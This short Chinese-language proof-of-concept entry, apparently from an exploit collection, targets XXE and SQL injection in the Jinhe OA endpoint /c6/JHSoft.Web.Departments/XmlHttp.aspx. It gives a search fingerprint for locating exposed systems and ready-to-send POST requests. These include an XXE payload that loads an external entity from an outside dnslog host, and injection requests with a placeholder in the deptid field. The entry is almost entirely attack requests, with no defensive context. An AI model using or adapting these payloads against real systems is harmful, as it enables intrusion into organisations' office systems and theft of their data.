# 金和OAJHSoft.Web.DepartmentsXmlHttp.aspx存在XXE和SQL注入漏洞

- **系统**：金和OA　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /c6/JHSoft.Web.Departments/XmlHttp.aspx/ HTTP/1.1`

**请求体 / payload**
```
XXE
Host:
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
注入
POST /c6/JHSoft.Web.Departments/XmlHttp.aspx/ HTTP/1.1
Host:
<root>
<Flag>GetSubDeptsByID</Flag>
<deptid>SQLI_POC</deptid>
</root>
POST /c6/JHSoft.Web.Departments/XmlHttp.aspx/ HTTP/1.1
Host:
<root>
<Flag>IsCompany</Flag>
<deptid>SQLI_POC</deptid>
</root>
```
- **预期**：200　|　—